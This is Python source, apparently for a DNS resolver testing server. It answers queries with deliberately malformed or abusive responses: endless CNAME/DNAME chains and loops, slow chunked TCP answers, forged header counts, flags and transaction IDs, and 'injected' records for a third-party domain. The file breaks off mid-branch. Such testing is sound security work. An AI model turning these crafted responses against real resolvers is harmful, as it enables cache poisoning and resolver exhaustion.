import struct
import binascii
import socket
import socketserver
import threading
import string
import random
import time
import sys
import os
import tomllib

version = "1.0"
stamp = str(time.time()).ljust(18, "0")
print("%s | PolarDNS %s server starting up" % (stamp, version))

################################

### PARSE CONFIGURATION
# note: this has some transformation as not to break the existing usage of config variable
# please update the usage to simplify this transformation in future iteration`
with open("polardns.toml", "rb") as f:
    _config = tomllib.load(f)
config = {k:v for k,v in _config['main'].items() if k != 'known_servers'}

known_servers = {}
for line in _config['main']['known_servers'].split('\n'):
    if not line:
        continue
    host, ip_address = line.split()
    known_servers[host] = ip_address

config['known_servers'] = known_servers
debug = config['debug']

### END PARSE CONFIGURATION

globalttl = int(config['ttl'])
globalsleep = float(config['sleep'])

# a domain which is a 3rd party which we don't control
a3rdparty_domain = config['a3rdparty_domain']

# domains for which we want to be authoritative
OURDOMAINS = [
   config['domain'],
   a3rdparty_domain,
   "anything.com",
   "version.polar"
]

ZONEFILE = {
   "ns1."+config['domain']:   {"A": config['ns1']},
   "ns2."+config['domain']:   {"A": config['ns2']},
   "end."+config['domain']:   {"A": "1.2.3.4"},
   config['domain']:       {"NS": "ns1."+config['domain'],
                             "MX": "10 mail1."+config['domain'],
                             "TXT": "hello, this is a testing domain",
                             "SOA": "ns1."+config['domain']+" hostmaster."+config['domain']+" 2023052903 10800 3600 604800 3600"},
   "mail1."+config['domain']:                    {"A": "1.2.3.4"},
   "hello."+config['domain']:                    {"A": "1.2.3.4"},
   "injected."+a3rdparty_domain:                 {"A": "6.6.6.0"},
   "injected10."+a3rdparty_domain:               {"A": "6.6.6.10"},
   "injected11."+a3rdparty_domain:               {"A": "6.6.6.11"},
   "injected12."+a3rdparty_domain:               {"A": "6.6.6.12"},
   "injected13."+a3rdparty_domain:               {"A": "6.6.6.13"},
   "ns1."+a3rdparty_domain:                      {"A": config['ns1']},
   "ns1."+a3rdparty_domain+"."+config['domain']: {"A": config['ns1']},
   "ns1."+config['domain']+"."+a3rdparty_domain: {"A": config['ns1']}
}

known_servers = config['known_servers']

DNSCLASS = {
   "IN":       1,
   "CH":       3,
   "HS":       4
}

DNSTYPE = {
   "A":           1,
   "NS":          2,
   "MD":          3,
   "MF":          4,
   "CNAME":       5,
   "SOA":         6,
   "MB":          7,
   "MG":          8,
   "MR":          9,
   "NULL":       10,
   "WKS":        11,
   "PTR":        12,
   "HINFO":      13,
   "MINFO":      14,
   "MX":         15,
   "TXT":        16,
   "RP":         17,
   "AFSDB":      18,
   "X25":        19,
   "ISDN":       20,
   "RT":         21,
   "NSAP":       22,
   "NSAP-PTR":   23,
   "SIG":        24,
   "KEY":        25,
   "PX":         26,
   "GPOS":       27,
   "AAAA":       28,
   "LOC":        29,
   "NXT":        30,
   "EID":        31,
   "NIMLOC":     32,
   "SRV":        33,
   "ATMA":       34,
   "NAPTR":      35,
   "KX":         36,
   "CERT":       37,
   "A6":         38,
   "DNAME":      39,
   "SINK":       40,
   "OPT":        41,
   "APL":        42,
   "DS":         43,
   "SSHFP":      44,
   "IPSECKEY":   45,
   "RRSIG":      46,
   "NSEC":       47,
   "DNSKEY":     48,
   "DHCID":      49,
   "NSEC3":      50,
   "NSEC3PARAM": 51,
   "TLSA":       52,
   "SMIMEA":     53,
   "HIP":        55,
   "NINFO":      56,
   "RKEY":       57,
   "TALINK":     58,
   "CDS":        59,
   "CDNSKEY":    60,
   "OPENPGPKEY": 61,
   "CSYNC":      62,
   "ZONEMD":     63,
   "SVCB":       64,
   "HTTPS":      65,
   "SPF":        99,
   "UINFO":      100,
   "UID":        101,
   "GID":        102,
   "UNSPEC":     103,
   "NID":        104,
   "L32":        105,
   "L64":        106,
   "LP":         107,
   "EUI48":      108,
   "EUI64":      109,
   "TKEY":       249,
   "TSIG":       250,
   "IXFR":       251,
   "AXFR":       252,
   "MAILB":      253,
   "MAILA":      254,
   "ANY":        255,
   "URI":        256,
   "CAA":        257,
   "AVC":        258,
   "DOA":        259,
   "AMTRELAY":   260,
   "TA":         32768,
   "DLV":        32769
}

# Function to get DNS class name (string) from code (int)
def getClassName(q):
    for key, val in DNSCLASS.items():
        if val == q:
            return key
    return "None"

# Function to get DNS class code (int) from name (string)
def getClassCode(q):
    return DNSCLASS.get(q)

# Function to get binary DNS class from name (string)
def getClassBin(q):
    code = DNSCLASS.get(q)
    return struct.pack(">H", code)

# Create a reverse dictionary of DNS types so that look ups are very fast
DNSTYPER = {}
for key, val in DNSTYPE.items():
    DNSTYPER[val] = key

# Function to get DNS type name (string) from code (int)
def getTypeName(q):
    return DNSTYPER.get(q)

# Function to get DNS type code (int) from name (string)
def getTypeCode(q):
    return DNSTYPE.get(q)

# Function to get binary DNS type from name (string)
def getTypeBin(q):
    code = DNSTYPE.get(q)
    return struct.pack(">H", code)

################################
# Function to convert domain name string to the binary form
# aka. DNS name notation
# input example: www.abcd.com
# output       : \x03www\x04abcd\x3com\x00

def convDom2Bin(x):
    if x == "": return b"\x00"
    buff = b""
    for y in x.split('.'):
        y = y.replace("<DOT>", ".")
        buff += bytes.fromhex(f'{len(y):02x}')
        buff += bytes(y, "utf-8")
    return (buff + b"\x00")

################################
# Function to convert data string to the binary form
# input example: somedata.something
# output       : \x08somedata\x09something

def convData2Bin(x):
    buff = b""
    for y in x.split('.'):
        y = y.replace("<DOT>", ".")
        buff += bytes.fromhex(f'{len(y):02x}')
        buff += bytes(y, "utf-8")
    return (buff)

################################
# Function to increment chainXXX if there is one

def increment_chain(req_domain):
   req_domain_labels = req_domain.split(".")
   new_domain_labels = req_domain_labels

   first_label = req_domain_labels[0]
   first_label_length = len(first_label)
   if first_label_length > 5:
      # how many last characters are numeric
      hmlcan = 0
      while True:
         lastchar = first_label[first_label_length-(hmlcan+1):]
         if lastchar.isnumeric():
            hmlcan += 1
         else:
            break
         if hmlcan >= first_label_length:
            break
      if hmlcan > 0:
         current_index = first_label[first_label_length-hmlcan:]
         subd_wo_index = first_label[0:first_label_length-hmlcan]
      else:
         current_index = 0
         subd_wo_index = first_label

      new_label_number = int(current_index)+1
      new_subdomain = subd_wo_index + str(new_label_number)
   else:
      new_subdomain = "chain1"

   # replace the subdomain with new incremented index (if there was no index, it will be "chain1")
   new_domain_labels[0] = new_subdomain

   # now construct a nice full domain name and return it
   new_domain_name = new_subdomain
   for l in range(1, len(new_domain_labels)):
      new_domain_name += "." + new_domain_labels[l]

   print("new domain name:", new_domain_name) if debug else True
   return new_domain_name

################################
# Function to generate random chainXXX

def random_chain(req_domain):
   req_domain_labels = req_domain.split(".")
   new_domain_labels = req_domain_labels

   first_label = req_domain_labels[0]
   first_label_length = len(first_label)
   new_random_number = random.randint(1,1000000)

   # how many last characters are numeric
   hmlcan = 0
   while True:
      lastchar = first_label[first_label_length-(hmlcan+1):]
      if lastchar.isnumeric():
         hmlcan += 1
      else:
         break
      if hmlcan >= first_label_length:
         break
   if hmlcan > 0:
      current_index = first_label[first_label_length-hmlcan:]
      subd_wo_index = first_label[0:first_label_length-hmlcan]
   else:
      current_index = 0
      subd_wo_index = first_label

   new_subdomain = subd_wo_index + str(new_random_number)

   # replace the subdomain with new incremented index (if there was no index, it will be "chain1")
   new_domain_labels[0] = new_subdomain

   # now construct a nice full domain name and return it
   new_domain_name = new_subdomain
   for l in range(1, len(new_domain_labels)):
      new_domain_name += "." + new_domain_labels[l]

   print("new domain name:", new_domain_name) if debug else True
   return new_domain_name

################################
# Function for printing messages on the console

def log(m):
    stamp = str(time.time()).ljust(18, "0")
    end = ""
    if customlen != 0:
       # custom length requested? print message at the end
       if proto == "tcp":
          end = " (LEN:" + str(customlen) + ")"
       else:
          end = " (Use LEN only in TCP!)"
    if not customlog:
       print("%s | %s %s %s | %s%s" % (stamp, client, req_type_str, req_domain, m, end))
    else:
       print("%s | %s %s %s | (%s) %s%s" % (stamp, client, req_type_str, req_domain, customlog, m, end))

################################
# Add custom message to the message on the console

def addcustomlog(m):
    global customlog
    if not customlog:
       customlog = m
    else:
       customlog += "," + m

################################
# Send buffer with DNS message (TCP and UDP)

def send_buf(self, buffer, totallen = 0):
   print("      Sending:", buffer) if debug else True
   print("        Sleep:", customsleep) if debug else True
   print("  Orig length:", len(buffer)) if debug else True
   print("Custom length:", customlen) if debug else True
   time.sleep(customsleep)
   # UDP mode
   if proto == "udp":
     self.wfile.write(buffer)
     self.wfile.flush()
     return
   # TCP mode - we have to add length (2 bytes) in the beginning
   if totallen == 0:
      tocalc = len(buffer) # calculate length
   else:
      tocalc = totallen # override length
   if customlen != 0:
      tocalc = customlen # override length by added '.lenXXX.' in the domain name
   newbuf = struct.pack(">H", tocalc)
   newbuf += buffer
   try:
       self.request.sendall(newbuf)
   except:
       return(-1)

################################
# Send buffer without length (TCP only)

def send_buf_wo_len(self, buffer):
   print("Sending:", buffer) if debug else True
   time.sleep(customsleep)
   try:
       self.request.sendall(buffer)
   except:
       return(-1)

################################
# Close connection

def close_conn(self):
   if proto == "tcp":
      # send proper FIN immediately
      self.request.close()
   else:
      # In UDP this will just send nothing and close the socket.
      # Nothing will be sent out.
      self.rfile.close()
      self.wfile.close()
      # Consider sending ICMP port unreachable packet instead, but this is
      # non-trivial to implement

################################
# Timeout the connection

def timeout_conn(self):
   if proto == "tcp":
      # Not possible to just abandon the TCP connections using socketserver.
      # Workaround below:
      # Wait 20 seconds and then close the socket gracefully (a resolver or
      # a client will unlikely wait 20 seconds for an answer) 
      time.sleep(20)
      self.finish()
   else:
      # In UDP this will just send nothing and close the socket.
      # Nothing will be sent out.
      self.rfile.close()
      self.wfile.close()
 
################################
# Function to get a sample random data appropriate to the record type

def getRandomDataOfType(thetype):
    databin = b''
    match thetype:
        # send random IP address
        case 1:
            data = '.'.join(str(random.randint(0, 255)) for _ in range(4))
            databin = socket.inet_aton(data)
        # send random hostname
        case 0 \
             |2 \
             |3 \
             |4 \
             |5 \
             |7 \
             |8 \
             |9 \
             |25:
            data = "hello." + ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(int(25))) + ".com"
            databin = convDom2Bin(data)
        # send some random data
        case 16:
            data = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(int(253)))
            databin = convData2Bin(data)
        case 6:
            # SOA
            # https://www.rfc-editor.org/rfc/rfc1035#section-3.3.13
            True
        case 21:
            # RT / Route Through
            # https://www.rfc-editor.org/rfc/rfc1183#section-3.3
            True
        case _:
            data = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(int(253)))
            databin = convData2Bin(data)
    return databin

################################

def prep_dns_header(flags, qurr, anrr, aurr, adrr):
    # Here we build the DNS header using the default values provided
    # via the above parameters. But, if these were requested to be
    # overriden (via the flgsXXX, qurrXXX, anrrXXX, aurrXXX or adrrXXX
    # modifiers), then they will be overriden here and a custom DNS
    # header will be constructed according to the user's specs.

    global cust_FLGS   # custom flags
    try: cust_FLGS
    except NameError: cust_FLGS = flags

    global cust_QURR   # custom number of Questions
    try: cust_QURR
    except NameError: cust_QURR = qurr

    global cust_ANRR   # custom number of Answer RRs
    try: cust_ANRR
    except NameError: cust_ANRR = anrr

    global cust_AURR   # custom number of Authority RRs
    try: cust_AURR
    except NameError: cust_AURR = aurr

    global cust_ADRR   # custom number of Additional RRs
    try: cust_ADRR
    except NameError: cust_ADRR = adrr

    # construct the DNS header
    buffer = cust_ID
    buffer += cust_FLGS
    buffer += struct.pack(">H", cust_QURR)
    buffer += struct.pack(">H", cust_ANRR)
    buffer += struct.pack(">H", cust_AURR)
    buffer += struct.pack(">H", cust_ADRR)

    del cust_FLGS
    del cust_QURR
    del cust_ANRR
    del cust_AURR
    del cust_ADRR
    # give the DNS header to the caller
    return buffer
 
################################
# Thread functions

class MyUDPHandler(socketserver.DatagramRequestHandler):
    def handle(self):
        req_RAW = self.request[0]
        if len(req_RAW) < 12:
           # packet too short
           return
        process_DNS(self, req_RAW)
    # override the finish function of the socketserver, because it throws an exception
    # when we want to close the UDP connection without sending anything
    def finish(self):
       try:
         super().finish()
       except ValueError:
         pass

class MyTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        req_RAW = self.request.recv(1024)
        if len(req_RAW) < 14:
           # packet too short
           return
        req_len = req_RAW[0:2]
        req_RAW = req_RAW[2:]
        process_DNS(self, req_RAW)

################################
# Process DNS packet

def process_DNS(self, req_RAW):
        if debug:
           req_HEX = binascii.b2a_hex(req_RAW)
           print("Request (RAW):", proto, req_RAW)
           print("Request (HEX):", proto, req_HEX)

        ##################################
        # Make a nice client IP/name string for logging on the console
        global client
        try:
            # try replace the client IP string with a name if we know this client
            client_label = known_servers[self.client_address[0]]
        except:
            # if we don't know this client IP, just put the IP address then
            client_label = self.client_address[0]
        # finally, make the nice client string
        client = format(proto) + "://" + client_label + ":" + \
                 format(self.client_address[1]) + " " + \
                 binascii.hexlify(req_RAW[0:2]).decode('ascii')
        #      proto://ip-address:port trx-id
        # e.g. tcp://54.166.138.71:59965 09b5

        #print("thread id: %d" % (threading.get_ident()))
        ##################################
        # 1. Parse the DNS request, the flags, number of records and the question domain name

        req_ID    = req_RAW[0:2]
        req_FLAGS = req_RAW[2:4]
        req_QURR  = int.from_bytes(req_RAW[4:6], "big")
        req_ANRR  = int.from_bytes(req_RAW[6:8], "big")
        req_AURR  = int.from_bytes(req_RAW[8:10], "big")
        req_ADRR  = int.from_bytes(req_RAW[10:12], "big")

        # decode the domain name in the question
        global req_domain
        global req_type_str
        req_domain_labels = []    # sOMeThINg whaTEVeR ANytHinG cOM
        req_domain_labels_lc = [] # something whatever anything com
        req_domain = ""           # sOMeThINg.whaTEVeR.ANytHinG.cOM
        offset = 12
        try:
           while True:
               size = int.from_bytes(req_RAW[offset:offset+1], 'big')
               if size == 0:
                  offset += 1
                  break
               label = req_RAW[offset+1:offset+1+size].decode('utf-8', 'backslashreplace')
               label = label.replace(".", "<DOT>")
               print("size: %d, label: %s" % (size, label)) if debug else True
               req_domain_labels.append(label)
               req_domain_labels_lc.append(label.lower())
               if offset == 12:
                 req_domain = label
               else:
                 req_domain += "." + label
               offset += size + 1
        except:
           stamp = str(time.time()).ljust(18, "0")
           print("%s | %s ? ? | ERROR: Cannot parse query name | (len: %d) %s" % (stamp, client, len(req_RAW)+2, binascii.b2a_hex(req_RAW)))
           return

        try:
            first_label = req_domain_labels_lc[0]  # something
        except:
            # someone is asking for the root e.g., for the root name servers, where the requested domain name is just empty
            first_label = ""

        try:
            req_type_bin = req_RAW[int(offset):int(offset)+2]
            req_type_int = struct.unpack(">H", req_type_bin)[0]
            req_type_str = getTypeName(req_type_int)

            req_class_bin = req_RAW[int(offset)+2:int(offset)+4]
            req_class_int = struct.unpack(">H", req_class_bin)[0]
            req_class_str = getClassName(req_class_int)
        except:
           stamp = str(time.time()).ljust(18, "0")
           print("%s | %s ? %s | ERROR: Cannot parse query | (len: %d) %s" % (stamp, client, req_domain.strip(), len(req_RAW)+2, binascii.b2a_hex(req_RAW)))
           return

        print("Request from %s %s %s" % (client , req_type_str, req_domain)) if debug else True

        ###############################################
        # 2. Extract SLD+TLD to see later if we are authoritative or not

        try:
            sld = req_domain_labels_lc[int(len(req_domain_labels_lc)-2)]  # anything
            tld = req_domain_labels_lc[int(len(req_domain_labels_lc)-1)]  # com
        except:
            sld = ""
            tld = ""
        sld_tld_domain = sld + "." + tld  # anything.com
        print("SLD + TLD:", sld_tld_domain) if debug else True

        ###############################################
        # 3. Check for global modifiers here which can influence how we respond.
        # These modifiers can come in the requested domain name in any position as a separate subdomain.
         
        # Supported global modifiers are:
        #  slp   - delay before responding (in miliseconds) e.g.:
        #          .slp1000.(1 second delay)
        #  ttl   - set specific TTL value for this response e.g.:
        #          .ttl3600. (1 hour TTL)
        #  len   - in TCP mode set arbitrary length value in the 
        #          beginning of the packet e.g.: .len123.
        #  newid - generate a new random transaction ID in the response
        #  noq   - remove the question section from the response body
        #          (!not the DNS header!, see qurr below)
        #  tc    - in UDP mode respond with truncated bit set so that the
        #          client/server will retry with TCP
        #  flgs  - set custom flags, either in hex (0x????) or in decimal
        #          (0-65535) or rand to generate random, e.g.: .flgsrand.
        #  qurr  - set custom number of Questions in the DNS header
        #  anrr  - set custom number of Answer RRs in the DNS header
        #  aurr  - set custom number of Authority RRs in the DNS header
        #  adrr  - set custom number of Additional RRs in the DNS header

        global customsleep
        global customttl
        global customlen
        global customlog # for adding additional message in the console output
        customsleep = globalsleep
        customttl = globalttl
        customlen = 0
        customlog = ""
        noq = 1 # number of questions

        global cust_ID
        cust_ID = req_ID # naturaly, set the ID in the response to the same ID as in the query, but
                         # keep in mind that a new random ID can be generated via the 'newid' global modifier

        global cust_FLGS # for overriding the flags in the DNS header
        global cust_QURR # for overriding the number of questions in the DNS header
        global cust_ANRR # for overriding the number of answer RR in the DNS header
        global cust_AURR # for overriding the number of authority RR in the DNS header
        global cust_ADRR # for overriding the number of additional RR in the DNS header

        # Check if any domain label starts with any of the global modifiers
        # Is there custom sleep (".slpXXXX.") or custom TTL (".ttlXXX.") or custom length (".lenXXX.") in the domain name?
        for item in req_domain_labels_lc:
            if item.startswith('slp'):        # custom delay requested
               if item[3:].isnumeric():
                  customsleep = float(int(item[3:])/1000)
            elif item.startswith('ttl'):      # custom TTL requested
               if item[3:].isnumeric():
                  customttl = int(item[3:])
            elif item.startswith('len'):      # TCP length override
               if item[3:].isnumeric():
                  n = int(item[3:])
                  if n > 65535: n = 65535
                  customlen = n
            elif item == "newid":             # new random transaction ID
               cust_ID = struct.pack(">H", random.randint(0,65535))
               addcustomlog("NEWID")
            elif item.startswith('flgs'):     # set custom flags in the DNS header
               if item[4:].isnumeric():
                  n = int(item[4:])
                  if n > 65535: n = 65535
                  cust_FLGS = struct.pack(">H", n)
                  addcustomlog("FLGS:" + hex(n))
               elif item[4:6] == "0x":
                  n = int(item[6:], base=16)
                  if n > 65535: n = 65535
                  cust_FLGS = struct.pack(">H", n)
                  addcustomlog("FLGS:" + hex(n))
               elif item[4:8] == "rand":
                  n = random.randint(0,65535)
                  cust_FLGS = struct.pack(">H", n)
                  addcustomlog("FLGS:" + hex(n))
            elif item.startswith('qurr'):     # set custom number of questions in the DNS header
               if item[4:].isnumeric():
                  n = int(item[4:])
                  if n > 65535: n = 65535
                  cust_QURR = n
                  addcustomlog("QURR:" + str(cust_QURR))
            elif item.startswith('anrr'):     # set custom number of answer RR in the DNS header
               if item[4:].isnumeric():
                  n = int(item[4:])
                  if n > 65535: n = 65535
                  cust_ANRR = n
                  addcustomlog("ANRR:" + str(cust_ANRR))
            elif item.startswith('aurr'):     # set custom number of authority RR in the DNS header
               if item[4:].isnumeric():
                  n = int(item[4:])
                  if n > 65535: n = 65535
                  cust_AURR = n
                  addcustomlog("AURR:" + str(cust_AURR))
            elif item.startswith('adrr'):     # set custom number of additional RR in the DNS header
               if item[4:].isnumeric():
                  n = int(item[4:])
                  if n > 65535: n = 65535
                  cust_ADRR = n
                  addcustomlog("ADRR:" + str(cust_ADRR))
            elif item == "noq":               # remove the question from the response query section
               noq = 0
               addcustomlog("NOQ")
            elif item == "tc" and proto == "udp": # request truncation
               # In UDP let's send only empty response with Truncated flag set.
               # This will prompt server/client to retry using TCP.
               buffer = prep_dns_header(b'\x87\x00', req_QURR, 0, 0, 0)
               if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
               log("only a header with truncated flag (TC)")
               send_buf(self, buffer)
               return

        ###############################################
        # 4. The main logical functionality starts here where it is possible to respond in a custom way to any specific query.
        # In every if/elsif branch we craft the response and send it out back to the client.
         
        # First check if we are authoritative for the requested domain

        #####################################################################
        if req_type_str == "NS" and (sld_tld_domain == "." or sld_tld_domain not in OURDOMAINS):
           # Asking for the root nameservers or some other nameservers for a domain we are not authoritative for
           # dig . @127.0.0.1 NS +noedns
           # #########################
           # 1) Close the connection
           log("just closing connection")
           time.sleep(customsleep)
           close_conn(self)
        #####################################################################
        elif sld_tld_domain not in OURDOMAINS:
           # We are NOT authoritative, send Refused
           log("Refused")
           ### DNS header ########
           # Response, Non-Authoritative, Refused
           buffer = prep_dns_header(b'\x80\x05', req_QURR, 0, 0, 0)
           ### QUESTION SECTION ########
           if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
           # no answer section, only send out the header
           send_buf(self, buffer)
        #####################################################################
        else: # We are authoritative
           if ZONEFILE.get(req_domain.lower()) != None:
              # We have the domain in the zone file, so let's try to return proper record
              # Check if we have such record in our zone file for the domain
              if req_type_str not in ZONEFILE[req_domain.lower()]:
                 # We don't have this record, so let's respond with NXDOMAIN
                 buffer = prep_dns_header(b'\x84\x03', req_QURR, 0, 0, 0)
                 if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
                 send_buf(self, buffer)
                 log("NXDOMAIN")
                 return
              ans = ZONEFILE[req_domain.lower()][req_type_str]
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += struct.pack(">L", customttl)   ## TTL
              # # ################################### # #
              if req_type_str == "A":
                 size = 4
                 data = socket.inet_aton(ans)          ## IP
              # # # # # # # # # # # # # # # # # # # # # #
              elif req_type_str == "MX":
                 tmp = ans.split()
                 data = struct.pack(">H", int(tmp[0])) ## preference
                 data += convDom2Bin(tmp[1])           ## mail server
                 size = len(tmp[1])+4
              # # # # # # # # # # # # # # # # # # # # # #
              elif req_type_str == "TXT":
                 size = len(ans)+1
                 data = convData2Bin(ans)              ## TXT record
              # # # # # # # # # # # # # # # # # # # # # #
              elif req_type_str == "SOA":
                 tmp = ans.split()                      ## SOA record
                 data = convDom2Bin(tmp[0])             ## Primary NS
                 data += convDom2Bin(tmp[1])            ## Primary contact
                 data += struct.pack(">L", int(tmp[2])) ## Serial
                 data += struct.pack(">L", int(tmp[3])) ## Zone refresh timer
                 data += struct.pack(">L", int(tmp[4])) ## Failed refresh retry timer
                 data += struct.pack(">L", int(tmp[5])) ## Zone expiry timer
                 data += struct.pack(">L", int(tmp[6])) ## Minimum TTL
                 size = len(data)
              # # # # # # # # # # # # # # # # # # # # # #
              else:
                 size = len(ans)+2
                 data = convDom2Bin(ans)
              # # ################################### # #
              buffer += struct.pack(">H", size)        ## Data length
              buffer += data                           ## The data
              log("%s %s" % (req_type_str, ans))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("always") or first_label.startswith("something"):
              # Always resolve what starts with always or something
              ip = "2.3.4.5"
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # A
              buffer += convDom2Bin(req_domain) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                    ## TTL
              buffer += struct.pack(">H", 4)                            ## Data length
              buffer += socket.inet_aton(ip)                            ## IP
              # log and send
              log("A %s" % (ip))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("chain"):
              # Send incremented CNAME
              new_domain_name = increment_chain(req_domain)
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                   ## TTL
              buffer += struct.pack(">H", len(new_domain_name)+2)      ## Data length
              buffer += convDom2Bin(new_domain_name)                   ## CNAME value
              # log and send
              log("CNAME %s" % (new_domain_name))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("dchain"):
              # Send incremented DNAME
              new_domain_name = increment_chain(req_domain)
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("DNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                   ## TTL
              buffer += struct.pack(">H", len(new_domain_name)+2)      ## Data length
              buffer += convDom2Bin(new_domain_name)                   ## DNAME value
              # log and send
              log("DNAME %s" % (new_domain_name))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("schain"):
              # Send 3 random schain CNAMEs
              dom = random_chain(req_domain)
              dom2 = random_chain(req_domain)
              dom3 = random_chain(req_domain)
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 3, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", len(dom)+2)              ## Data length
              buffer += convDom2Bin(dom)                           ## CNAME value
              # 2nd CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", len(dom2)+2)             ## Data length
              buffer += convDom2Bin(dom2)                          ## CNAME value
              # 3rd CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", len(dom3)+2)             ## Data length
              buffer += convDom2Bin(dom3)                          ## CNAME value
              # log and send
              log("CNAME %s, %s, %s" % (dom, dom2, dom3))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("loop"):
              # Do a CNAME loop
              if req_domain_labels[1].isnumeric() and req_domain_labels[2].isnumeric():
                 # we are already in a loop, e.g.:
                 # loop.10.4.dnslabtest.com
                 max = int(req_domain_labels[1])
                 cur = int(req_domain_labels[2])
                 if cur >= max:
                    # go back to the beginning of the loop
                    new_domain_name = req_domain_labels[0] + "." + str(max) + ".1"
                 else:
                    # increment the current index
                    new_domain_name = req_domain_labels[0] + "." + str(max) + "." + str(cur+1)
                 for i in range(len(req_domain_labels)-3):
                    new_domain_name += "." + req_domain_labels[i+3]
              elif req_domain_labels[1].isnumeric():
                 # we are in beginning of a loop with a requested max value, e.g.:
                 # loop.10.dnslabtest.com
                 max = int(req_domain_labels[1])
                 if max < 1:
                    max = 1
                 new_domain_name = req_domain_labels[0] + "." + str(max) + "." + "1"
                 for i in range(len(req_domain_labels)-2):
                    new_domain_name += "." + req_domain_labels[i+2]
              else:
                 # just immediate loop
                 new_domain_name = req_domain
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                   ## TTL
              buffer += struct.pack(">H", len(new_domain_name)+2)      ## Data length
              buffer += convDom2Bin(new_domain_name)                   ## CNAME value
              # log and send
              log("CNAME LOOP %s" % (new_domain_name))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("chunkedcnames"):
              # Send slowly N random CNAMEs
              nans = 10  # number of answers (10 default)
              if req_domain_labels[1].isnumeric():
                 nans = int(req_domain_labels[1])
              print("req domain name:", req_domain) if debug else True
              # In UDP mode, set the Truncated (TC) flag in the response and only send the DNS header,
              # because now the client/dns resolver will ask again using TCP
              if proto == "udp":
                 log("sending only header with truncated flag")
                 ### DNS header ########
                 # Response, Authoritative, Truncated (TC), Recursion desired
                 buffer = prep_dns_header(b'\x87\x00', req_QURR, 0, 0, 0)
                 ### QUESTION SECTION ########
                 if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
                 send_buf(self, buffer)
                 return
              ### In TCP mode
              ### 1. First construct the whole buffer to calculate the total length
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, nans, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              # generate alwaysXXXX domains
              doms = []
              for i in range(nans):
                  dom = "always" + str(random.randint(100000,999999)) + "." + sld_tld_domain
                  doms.append(dom)
                  buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
                  buffer += struct.pack(">L", customttl)               ## TTL
                  buffer += struct.pack(">H", len(dom)+2)              ## Data length
                  buffer += convDom2Bin(dom)                           ## CNAME value
              ### 2. Now calculate total length
              totallen = len(buffer)
              ### 3. Now redo the buffer and start actually sending chunk by chunk
              log("sending chunked %d CNAMEs with %.2f ms delay" % (nans, customsleep))
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, nans, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              send_buf(self, buffer, totallen)
              ### ANSWER SECTION ########
              for i in range(nans):
                  dom = doms[i]
                  buffer  = convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
                  buffer += struct.pack(">L", customttl)               ## TTL
                  buffer += struct.pack(">H", len(dom)+2)              ## Data length
                  buffer += convDom2Bin(dom)                           ## CNAME value
                  log("sending %d/%d CNAMEs %s" % (i+1, nans, dom))
                  if send_buf_wo_len(self, buffer) == -1:
                     t = time.localtime()
                     stamp = str(time.time()).ljust(18, "0")
                     print("%s Conne closed %s" % (stamp, client))
                     return
              #####################################################################
           elif first_label.startswith("cutabuf"):
